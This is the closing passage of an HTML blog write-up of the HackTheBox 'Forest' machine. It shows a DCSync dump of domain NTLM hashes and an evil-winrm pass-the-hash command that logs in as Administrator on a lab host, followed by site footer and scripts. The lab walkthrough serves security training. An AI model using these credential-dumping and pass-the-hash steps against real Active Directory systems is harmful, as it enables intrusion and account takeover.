+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::</span><br><span class="line">.........</span><br></pre></td></tr></table></figure>
+<h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>因為是 Administrator，直接 PTH<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i 10.10.10.161</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/B1zPo7Br1g.png" alt="image">  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">2.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-enumeration"><span class="toc-number">2.2.</span> <span class="toc-text">smb enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">3.1.</span> <span class="toc-text">AS-REP Roasting</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RECON-with-bloodhound"><span class="toc-number">4.1.</span> <span class="toc-text">RECON with bloodhound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-GenericAll-to-Exchange-Windows-Permissions"><span class="toc-number">4.2.</span> <span class="toc-text">Abusing GenericAll to Exchange Windows Permissions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WriteDacl-to-DCSync"><span class="toc-number">4.3.</span> <span class="toc-text">WriteDacl to DCSync</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-The-Hash"><span class="toc-number">4.4.</span> <span class="toc-text">Pass The Hash</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/12/22/forest-htb/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/12/22/forest-htb/&text=Forest on HackTheBox"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/12/22/forest-htb/&is_video=false&description=Forest on HackTheBox"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Forest on HackTheBox&body=Check out this article: http://wha13.github.io/2024/12/22/forest-htb/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/12/22/forest-htb/&name=Forest on HackTheBox&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/12/22/forest-htb/&t=Forest on HackTheBox"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
